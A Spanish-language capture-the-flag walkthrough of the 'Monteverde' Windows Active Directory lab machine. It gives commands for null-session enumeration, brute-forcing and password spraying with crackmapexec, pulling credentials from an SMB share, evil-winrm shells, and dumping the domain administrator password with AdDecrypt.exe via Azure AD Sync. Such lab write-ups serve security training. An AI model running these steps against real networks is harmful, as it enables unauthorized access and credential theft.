
# Monteverde - Medium

## Enumeración

>Al realizarle un ICMP ECHO Request a la máquina víctima, podemos observar que se trata de una máquina Windows debido a que su TTL tiende a 128: 

```bash
ping -c 3 IP
```

![Pasted image 20240828215318](https://github.com/user-attachments/assets/33e0727c-f4da-4ca9-910e-b890e0c65458)

>Ahora vamos a enumerar posibles puertos abiertos mediante el uso de la herramienta **nmap**, como podemos ver, se trata de un Active Directory debido a algunos de sus puertos expuestos:

```bash
nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 IP -oG scan
```

![Pasted image 20240828215354](https://github.com/user-attachments/assets/0b8d2fdb-db69-47e2-b748-7961996ee9ab)


>Ahora vamos a realizar un escaneo de versión y de scripts de reconocimiento a los puertos encontrados:

```bash
nmap -p[listaPuertos] -sCV -Pn -n -vvv IP
```

![Pasted image 20240828215759](https://github.com/user-attachments/assets/a17da0c1-2e45-409a-affd-5f744e7055f2)



>Como encontramos un FQDN (Fully Quallified Domain Name), vamos a introducirlo en nuestro /etc/hosts para que nuestro resolutor sepa que ese dominio corresponde a la dirección IP de la máquina víctima:

```bash
sudo nano /etc/hosts
```
![Pasted image 20240828215844](https://github.com/user-attachments/assets/4d6422e4-8042-466b-ade1-420f265f713f)


>Ahora vamos a tratar de enumerar el sistema operativo y dominio de la máquina mediante la utilidad **crackmapexec**:

```bash
crackmapexec smb IP 2>/dev/null
```

![Pasted image 20240828220001](https://github.com/user-attachments/assets/68633ab6-1735-49ba-be3a-6760b8d75a0e)


>Como encontramos otro FQDN vamos a agregarlo al /etc/hosts:

```bash
sudo nano /etc/hosts
```

![Pasted image 20240828220033](https://github.com/user-attachments/assets/0698ba15-997e-444e-ae65-62b6997b0ae5)


>Ahora vamos a enumerar los shares del protocolo SMB mediante una NULL Session, como podemos ver, no podemos listar shares mediante una NULL Session:

```bash
smbmap -H IP
smbclient -L IP -N
```

![Pasted image 20240828220216](https://github.com/user-attachments/assets/ca6c733e-31ef-47e7-a4f5-35d5f2c35308)


>Como el puerto TCP 53 correspondiente al DNS (Domain Name System) se encuentra abierto, vamos a tratar de realizar un ataque de transferencia de zona para enumerar posibles subdominios, pero no nos reporta nada:

```bash
dig axfr domain @IP
```

![Pasted image 20240828220629](https://github.com/user-attachments/assets/050a4659-acde-4aa1-866b-9b8136ced28e)


>Vamos a tratar de conectarnos mediante la utilidad **rpcclient** a una sesión de RPC mediante una NULL Session y ya que ha sido efectuada enumerar usuarios del dominio:

```bash
rpcclient -U "" IP -N
```

```rpcclient
enumdomusers
```

![Pasted image 20240828221615](https://github.com/user-attachments/assets/833a74ab-a46c-4659-a8b8-beae4dfced92)


>Ahora vamos a copiar estos usuarios y meterlos en un archivo. Tras esto, deberemos de tratar el archivo para quedarnos únicamente con el nombre de los usuarios:

```bash
cat users | awk '{print $2}' FS=":" | awk '{print $1}' | tr -d "[]" > users
```

![Pasted image 20240828222038](https://github.com/user-attachments/assets/6aad07a5-7888-46ff-9f24-63d92b6a797c)


>Ahora vamos a enumerar grupos del dominio:

```rpcclient
enumdomgroups
```

![Pasted image 20240828222523](https://github.com/user-attachments/assets/fbe1d0c8-1634-44d4-8464-4a19e17863c1)


>Ahora vamos a ver información más detallada acerca de los usuarios:

```rpcclient
enumdomusers
querydispinfo
```

![Pasted image 20240828222608](https://github.com/user-attachments/assets/5433e17c-9049-4f1a-aaef-2f3e460f1c74)


>Ahora, al tratar de realizar un ataque ASREPRoast no hemos encontrado ningún usuario vulnerable:

![Pasted image 20240828223140](https://github.com/user-attachments/assets/5131dfd2-0d79-42fd-a25b-c7bd15968e13)


>Ahora, vamos a realizar un proceso de fuerza bruta mediante **crackmapexec** para comprobar si los usuarios tienen de contraseña sus propios usuarios:

```bash
crackmapexec smb IP 2>/dev/null -u users -p users
```

![Pasted image 20240828223347](https://github.com/user-attachments/assets/04f23309-581e-431b-8893-2630a4ae00b9)

>Ahora vamos a emplear las credenciales de ese usuario para listar shares a los que tenga acceso:

```bash
crackmapexec smb IP 2>/dev/null -u SABatchJobs -p SABatchJobs --shares
```

![Pasted image 20240828223521](https://github.com/user-attachments/assets/c260f9b7-803a-4253-bfe8-6bbc34f647a3)

>Ahora hemos encontrado un archivo interesante: "azure.xml", por lo que nos lo traeremos a la máquina atacante para leerlo:

```bash
smbclient \\\\IP\\users$ -U SABatchJobs
```

```smb
get azure.xml
```

![Pasted image 20240828224035](https://github.com/user-attachments/assets/1cf5796a-56e4-451b-b57d-144cc7d4c4e8)

>Al leer el contenido del archivo, podemos ver las credenciales de algún usuario en azure y posiblemente en el sistema:

```bash
cat azure.xml
```

![Pasted image 20240828224136](https://github.com/user-attachments/assets/f602d523-15ab-4e2a-9153-701b5b599e83)


# Explotación

>También podemos ver si algún usuario es kerberoasteable al tener acceso a un usuario, pero ninguno lo es:

```bash
impacket-GetUserSPNs domain/user:password -request
```

![Pasted image 20240828224542](https://github.com/user-attachments/assets/c94145ac-8f07-4ac6-8eea-750f50b79c01)

>Mediante crackmapexec, vamos a también ver si el usuario encontrado pertenece al grupo de Remote Management Users, que son los que tienen acceso al winrm, pero no pertenece:

```bash
crackmapexec winrm IP 2>/dev/null -u user -p password
```

![Pasted image 20240828224737](https://github.com/user-attachments/assets/c1a87073-2118-4776-8b05-9bb937824d50)

>Ahora vamos a realizar un Password spraying para ver si algún usuario posee como contraseña la encontrada en el documento azure.xml, y como podemos ver, el usuario mhope tiene dicha contraseña:

```bash
crackmapexec smb IP 2>/dev/null -u users -p password
```

![Pasted image 20240828224928](https://github.com/user-attachments/assets/d2f407bc-366f-42a4-85d0-a475f098dfdb)


>Ahora vamos a verificar si este usuario pertenece al grupo Remote Management Users y podemos ver que este usuario puede ganar una consola mediante evil-winrm:

```bash
crackmapexec winrm IP 2>/dev/null -u mhope -p password
```

![Pasted image 20240828225049](https://github.com/user-attachments/assets/a6e325c3-7f7a-4706-8485-ed5d39770424)

>Ahora vamos a emplear la utilidad **evil-winrm** para acceder al equipo remotamente como el usuario mhope:

```bash
evil-winrm -i IP -u 'usuario' -p 'password'
```

![Pasted image 20240828225302](https://github.com/user-attachments/assets/417833c9-6c5d-4bad-9438-a9af7e068b76)

>En el escritorio de este usuario encontraríamos la primera flag:

```evil-winrm
cd ../Desktop
type user.txt
```

![Pasted image 20240828225430](https://github.com/user-attachments/assets/cc4c4a2b-d7b3-41aa-8bf6-e80233a72c3d)

# Escalada de privilegios

>Ahora, si listamos todo acerca del usuario, podemos ver que pertenece al grupo Azure Admins, esto es algo bastante peligroso de lo que vamos a poder aprovecharnos para escalar privilegios:

```evil-winrm
whoami /all
```

![Pasted image 20240828225637](https://github.com/user-attachments/assets/64f43613-1bd3-426e-ba86-e5265ccfeff7)

>También, en el directorio 'Program Files', podemos encontrar el directorio 'Microsoft Azure AD Sync', el cual mediante una vulnerabilidad conocida, podríamos escalar privilegios debido a pertenecer al grupo Azure Admins:

```evil-winrm
cd /
cd PROGRA~1
dir
```

![Pasted image 20240828230110](https://github.com/user-attachments/assets/340ac7af-0183-43e5-b469-a629160d4c32)

>Al ser administradores de Azure y existir este recurso hay una vulnerabilidad para poder listar credenciales del usuario Administrador del DC: https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0

![Pasted image 20240828230553](https://github.com/user-attachments/assets/994fa22c-e692-4df2-a8cd-ea211cb90623)


>Nos descargaremos la release marcada en la imagen:

![Pasted image 20240828230831](https://github.com/user-attachments/assets/ec305557-6721-4568-afe4-d1c97f76cc33)


>Ahora, vamos a dirigirnos al directorio temp y subir los dos archivos del zip:

```evil-winrm
cd "C:\Windows/temp"
upload ruta/al/recurso/mcrypt.dll
upload ruta/al/recurso/AdDecrypt.exe
```

![Pasted image 20240828231039](https://github.com/user-attachments/assets/2ccaf092-843a-412e-9c19-162b7aa3500a)


>Para lanzar el programa deberemos ir al siguiente directorio:

```evil-winrm
cd "C:\Program Files\Microsoft Azure AD Sync\Bin"
```

![Pasted image 20240828231216](https://github.com/user-attachments/assets/c9e58daa-8f0f-4c88-beeb-3bb358429065)


>Ahora vamos a ejecutar el binario para que nos liste las credenciales del usuario Administrador:

```evil-winrm
AdDecrypt.exe -fullSQL
```

![Pasted image 20240828231336](https://github.com/user-attachments/assets/35539b8b-d448-4fca-8b26-81cda3152e4a)


>Por último, al saber las credenciales del usuario administrador, solo nos queda crear otra sesión con **evil-winrm** con las credenciales de dicho usuario y ya tendríamos acceso a la flag de root y comprometido por completo la máquina.

```bash
evil-winrm -i IP -u 'administrator' -p 'password'
```

```evil-winrm
cd ../Desktop
type root.txt
```

![Pasted image 20240828231445](https://github.com/user-attachments/assets/0f88c764-0265-4c23-99b6-297b480928ec)

